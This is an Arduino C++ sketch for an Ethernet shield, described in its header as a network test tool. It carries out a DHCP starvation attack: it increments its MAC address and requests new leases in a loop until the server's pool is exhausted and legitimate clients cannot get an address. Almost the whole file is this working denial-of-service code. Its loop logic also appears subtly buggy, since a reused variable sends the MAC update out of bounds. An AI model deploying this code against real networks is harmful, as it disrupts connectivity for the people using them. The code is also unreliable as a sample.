/*
    dhcp-ip-spender v1.0
    ---------------------
    This program that runs on Arduino platform compatible with Arduino UNO and Mega with the Ethernet card WS5100 
    is designed to test the networks with dhcp protocol enabled, the concept is simple Arduino will change the MAC address 
    constantly and so with each change will be requested to the DHCP server That allocate a new IP until they do not find IPs available 
    to assign to legitimate clients who need a connection for work or communication is to exhaust the full pool of the server 
    that do not have a control of the flow of allocation of the same.
    
    
    Juan Carlos Lanuza L. - MGA-NI 19/FEB/2017
*/
#include <SPI.h>
#include <Ethernet.h>

EthernetClient client;

byte mac[6] = {0x00,0x00,0x00,0x00,0x00,0x00};
byte oct = 5;

void setup() 
{
  Serial.begin(9600);
}
void loop() 
{  
  if(mac[oct] >= 255)
  oct--;
  
  mac[oct] += 0x01;
  Ethernet.begin(mac);
  Serial.print("IP Gastada: ");
  for (int oct = 0;oct < 4;oct++) 
  {
    Serial.print(Ethernet.localIP()[oct],DEC);
    Serial.print(".");
  }
  Serial.print("  with MAC = ");
  for (oct = 0;oct < 6;oct++) 
  {
    Serial.print(mac[oct],HEX);
    Serial.print(":");
  }
  Serial.println();
}
